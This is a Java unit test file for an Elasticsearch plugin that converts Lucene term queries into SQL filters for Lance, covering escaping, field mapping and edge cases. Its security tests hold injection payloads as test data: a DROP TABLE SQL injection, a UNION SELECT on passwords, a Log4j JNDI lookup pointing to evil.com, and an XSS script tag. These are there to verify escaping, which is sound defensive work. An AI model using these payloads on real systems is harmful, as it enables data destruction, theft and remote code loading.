/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the "Elastic License
 * 2.0", the "GNU Affero General Public License v3.0 only", and the "Server Side
 * Public License v 1"; you may not use this file except in compliance with, at
 * your election, the "Elastic License 2.0", the "GNU Affero General Public
 * License v3.0 only", or the "Server Side Public License, v 1".
 */

package org.elasticsearch.plugin.lance.query;

import org.apache.lucene.index.Term;
import org.apache.lucene.search.MatchAllDocsQuery;
import org.apache.lucene.search.TermQuery;
import org.elasticsearch.test.ESTestCase;

import java.util.Map;

/**
 * Comprehensive unit tests for {@link EsToLanceFilterConverter}.
 * <p>
 * Test categories:
 * <ul>
 *   <li>Happy path: Normal term queries with various value types</li>
 *   <li>SQL injection prevention: Special characters are properly escaped</li>
 *   <li>Field mapping edge cases: Missing fields, empty mappings, etc.</li>
 *   <li>Query type validation: Unsupported queries throw appropriate exceptions</li>
 *   <li>Value edge cases: Empty strings, unicode, very long values</li>
 *   <li>Security: Injection attempts are neutralized</li>
 * </ul>
 */
public class EsToLanceFilterConverterTests extends ESTestCase {

    private EsToLanceFilterConverter converter;

    @Override
    public void setUp() throws Exception {
        super.setUp();
        converter = new EsToLanceFilterConverter();
    }

    // ==================== Happy Path Tests ====================

    public void testTermQueryWithStringValue() throws Exception {
        TermQuery query = new TermQuery(new Term("category", "electronics"));
        Map<String, String> mapping = Map.of("category", "product_category");

        String sql = converter.convert(query, mapping);

        assertEquals("product_category = 'electronics'", sql);
    }

    public void testTermQueryWithBooleanValue() throws Exception {
        TermQuery query = new TermQuery(new Term("active", "true"));
        Map<String, String> mapping = Map.of("active", "is_active");

        String sql = converter.convert(query, mapping);

        assertEquals("is_active = true", sql);
    }

    public void testTermQueryWithBooleanValueFalse() throws Exception {
        TermQuery query = new TermQuery(new Term("active", "false"));
        Map<String, String> mapping = Map.of("active", "is_active");

        String sql = converter.convert(query, mapping);

        assertEquals("is_active = false", sql);
    }

    public void testTermQueryWithNumericValue() throws Exception {
        TermQuery query = new TermQuery(new Term("count", "42"));
        Map<String, String> mapping = Map.of("count", "item_count");

        String sql = converter.convert(query, mapping);

        assertEquals("item_count = 42", sql);
    }

    public void testTermQueryWithNegativeNumericValue() throws Exception {
        TermQuery query = new TermQuery(new Term("balance", "-100"));
        Map<String, String> mapping = Map.of("balance", "account_balance");

        String sql = converter.convert(query, mapping);

        assertEquals("account_balance = -100", sql);
    }

    public void testTermQueryWithFloatingPointValue() throws Exception {
        TermQuery query = new TermQuery(new Term("price", "19.99"));
        Map<String, String> mapping = Map.of("price", "unit_price");

        String sql = converter.convert(query, mapping);

        assertEquals("unit_price = 19.99", sql);
    }

    public void testTermQueryWithFieldMapping() throws Exception {
        TermQuery query = new TermQuery(new Term("brand", "Nike"));
        Map<String, String> mapping = Map.of("category", "product_category", "brand", "brand_name", "color", "product_color");

        String sql = converter.convert(query, mapping);

        assertEquals("brand_name = 'Nike'", sql);
    }

    public void testTermQueryWithZeroValue() throws Exception {
        TermQuery query = new TermQuery(new Term("quantity", "0"));
        Map<String, String> mapping = Map.of("quantity", "stock_qty");

        String sql = converter.convert(query, mapping);

        assertEquals("stock_qty = 0", sql);
    }

    // ==================== SQL Injection / Special Characters Tests ====================

    public void testSingleQuoteEscaping() throws Exception {
        TermQuery query = new TermQuery(new Term("author", "O'Reilly"));
        Map<String, String> mapping = Map.of("author", "author_name");

        String sql = converter.convert(query, mapping);

        assertEquals("author_name = 'O''Reilly'", sql);
    }

    public void testMultipleSingleQuotes() throws Exception {
        TermQuery query = new TermQuery(new Term("phrase", "It's Joe's book"));
        Map<String, String> mapping = Map.of("phrase", "description");

        String sql = converter.convert(query, mapping);

        assertEquals("description = 'It''s Joe''s book'", sql);
    }

    public void testConsecutiveSingleQuotes() throws Exception {
        TermQuery query = new TermQuery(new Term("text", "test''quote"));
        Map<String, String> mapping = Map.of("text", "content");

        String sql = converter.convert(query, mapping);

        // Each single quote should be doubled
        assertEquals("content = 'test''''quote'", sql);
    }

    public void testBackslashHandling() throws Exception {
        // Backslashes should be preserved (not escaped for SQL)
        TermQuery query = new TermQuery(new Term("path", "C:\\Users\\file.txt"));
        Map<String, String> mapping = Map.of("path", "file_path");

        String sql = converter.convert(query, mapping);

        assertEquals("file_path = 'C:\\Users\\file.txt'", sql);
    }

    public void testUnicodeCharacters() throws Exception {
        TermQuery query = new TermQuery(new Term("name", "café"));
        Map<String, String> mapping = Map.of("name", "display_name");

        String sql = converter.convert(query, mapping);

        assertEquals("display_name = 'café'", sql);
    }

    public void testEmojiCharacters() throws Exception {
        TermQuery query = new TermQuery(new Term("status", "👍"));
        Map<String, String> mapping = Map.of("status", "reaction");

        String sql = converter.convert(query, mapping);

        assertEquals("reaction = '👍'", sql);
    }

    public void testChineseCharacters() throws Exception {
        TermQuery query = new TermQuery(new Term("city", "北京"));
        Map<String, String> mapping = Map.of("city", "location");

        String sql = converter.convert(query, mapping);

        assertEquals("location = '北京'", sql);
    }

    public void testEmptyStringValue() throws Exception {
        TermQuery query = new TermQuery(new Term("text", ""));
        Map<String, String> mapping = Map.of("text", "content");

        String sql = converter.convert(query, mapping);

        assertEquals("content = ''", sql);
    }

    // ==================== Field Mapping Edge Cases ====================

    public void testEmptyFieldMapping() {
        TermQuery query = new TermQuery(new Term("category", "electronics"));
        Map<String, String> mapping = Map.of();

        LanceFilterConversionException e = expectThrows(LanceFilterConversionException.class, () -> converter.convert(query, mapping));

        assertTrue(e instanceof UnmappedFieldException);
        assertEquals("category", ((UnmappedFieldException) e).getFieldName());
    }

    public void testFieldNotInMapping() {
        TermQuery query = new TermQuery(new Term("color", "red"));
        Map<String, String> mapping = Map.of("category", "product_category");

        LanceFilterConversionException e = expectThrows(LanceFilterConversionException.class, () -> converter.convert(query, mapping));

        assertTrue(e instanceof UnmappedFieldException);
        assertEquals("color", ((UnmappedFieldException) e).getFieldName());
    }

    public void testMultipleFieldsMapped() throws Exception {
        // Verify correct field is selected from a large mapping
        TermQuery query = new TermQuery(new Term("status", "active"));
        Map<String, String> mapping = Map.of(
            "category",
            "product_category",
            "brand",
            "brand_name",
            "color",
            "product_color",
            "size",
            "item_size",
            "status",
            "order_status",
            "priority",
            "task_priority"
        );

        String sql = converter.convert(query, mapping);

        assertEquals("order_status = 'active'", sql);
    }

    public void testFieldNameCollision() throws Exception {
        // ES field name equals Lance column name (should still work)
        TermQuery query = new TermQuery(new Term("category", "books"));
        Map<String, String> mapping = Map.of("category", "category");

        String sql = converter.convert(query, mapping);

        assertEquals("category = 'books'", sql);
    }

    // ==================== Query Type Edge Cases ====================

    public void testNullQuery() {
        LanceFilterConversionException e = expectThrows(LanceFilterConversionException.class, () -> converter.convert(null, Map.of()));

        assertTrue(e.getMessage().contains("Filter query is null"));
    }

    public void testNonTermQueryThrows() {
        // Use MatchAllDocsQuery as a concrete non-TermQuery type
        MatchAllDocsQuery nonTermQuery = new MatchAllDocsQuery();
        Map<String, String> mapping = Map.of("field", "column");

        LanceFilterConversionException e = expectThrows(
            LanceFilterConversionException.class,
            () -> converter.convert(nonTermQuery, mapping)
        );

        assertTrue(e instanceof UnsupportedQueryException);
    }

    // ==================== Value Edge Cases ====================

    public void testVeryLongStringValue() throws Exception {
        // Test with a very long string (simulating a description or URL)
        String longValue = "a".repeat(1000);
        TermQuery query = new TermQuery(new Term("description", longValue));
        Map<String, String> mapping = Map.of("description", "product_desc");

        String sql = converter.convert(query, mapping);

        assertEquals("product_desc = '" + longValue + "'", sql);
    }

    public void testNumericEdgeCases() throws Exception {
        // Test MAX_VALUE, MIN_VALUE scenarios
        TermQuery maxQuery = new TermQuery(new Term("value", "2147483647"));
        TermQuery minQuery = new TermQuery(new Term("value", "-2147483648"));
        Map<String, String> mapping = Map.of("value", "numeric_value");

        String maxSql = converter.convert(maxQuery, mapping);
        String minSql = converter.convert(minQuery, mapping);

        assertEquals("numeric_value = 2147483647", maxSql);
        assertEquals("numeric_value = -2147483648", minSql);
    }

    public void testBooleanEdgeCases() throws Exception {
        // Test case-insensitive boolean parsing
        TermQuery true1 = new TermQuery(new Term("flag", "true"));
        TermQuery true2 = new TermQuery(new Term("flag", "TRUE"));
        TermQuery true3 = new TermQuery(new Term("flag", "TrUe"));
        Map<String, String> mapping = Map.of("flag", "is_flagged");

        assertEquals("is_flagged = true", converter.convert(true1, mapping));
        assertEquals("is_flagged = true", converter.convert(true2, mapping));
        assertEquals("is_flagged = true", converter.convert(true3, mapping));
    }

    // ==================== Security Tests ====================

    public void testSqlInjectionAttempt_SingleQuoteIsEscaped() throws Exception {
        // Classic SQL injection attempt - the single quotes should be escaped
        TermQuery query = new TermQuery(new Term("id", "1'; DROP TABLE users; --"));
        Map<String, String> mapping = Map.of("id", "user_id");

        String sql = converter.convert(query, mapping);

        // The single quotes should be doubled, neutralizing the injection
        assertEquals("user_id = '1''; DROP TABLE users; --'", sql);
        // The text is preserved in the SQL but as a string literal, not executable
        assertTrue(sql.contains("DROP TABLE"));
        // Key: the escaped quote means the injection is neutralized
        assertTrue(sql.contains("'';"));
    }

    public void testSqlInjectionAttempt_UNION_SingleQuoteEscaped() throws Exception {
        TermQuery query = new TermQuery(new Term("name", "admin' UNION SELECT * FROM passwords--"));
        Map<String, String> mapping = Map.of("name", "username");

        String sql = converter.convert(query, mapping);

        assertEquals("username = 'admin'' UNION SELECT * FROM passwords--'", sql);
        // The text is preserved but escaped quotes neutralize the injection
        assertTrue(sql.contains("UNION SELECT"));
        assertTrue(sql.contains("'' "));
    }

    public void testSqlInjectionAttempt_Log4j_PreservedAsLiteral() throws Exception {
        // Log4j-style injection attempt - should be treated as a literal string
        TermQuery query = new TermQuery(new Term("input", "${jndi:ldap://evil.com/a}"));
        Map<String, String> mapping = Map.of("input", "user_input");

        String sql = converter.convert(query, mapping);

        assertEquals("user_input = '${jndi:ldap://evil.com/a}'", sql);
        // The JNDI injection string should be quoted as a literal, not executed
        assertTrue(sql.contains("'${jndi:ldap://evil.com/a}'"));
    }

    public void testSqlInjectionAttempt_XSS_PreservedAsLiteral() throws Exception {
        // XSS-style injection attempt - should be treated as a literal string
        TermQuery query = new TermQuery(new Term("html", "<script>alert('XSS')</script>"));
        Map<String, String> mapping = Map.of("html", "content");

        String sql = converter.convert(query, mapping);

        assertEquals("content = '<script>alert(''XSS'')</script>'", sql);
        // Verify the single quote inside the script tag is escaped
        assertTrue(sql.contains("''XSS''"));
    }

    public void testSpecialCharactersArePreserved() throws Exception {
        // Ensure legitimate special characters are not over-escaped
        TermQuery query = new TermQuery(new Term("email", "user+tag@example.com"));
        Map<String, String> mapping = Map.of("email", "contact_email");

        String sql = converter.convert(query, mapping);

        assertEquals("contact_email = 'user+tag@example.com'", sql);
    }

    public void testUrlPreserved() throws Exception {
        // URLs should be preserved as-is (except for single quotes)
        TermQuery query = new TermQuery(new Term("url", "https://example.com/path?query=value"));
        Map<String, String> mapping = Map.of("url", "website_url");

        String sql = converter.convert(query, mapping);

        assertEquals("website_url = 'https://example.com/path?query=value'", sql);
    }
}
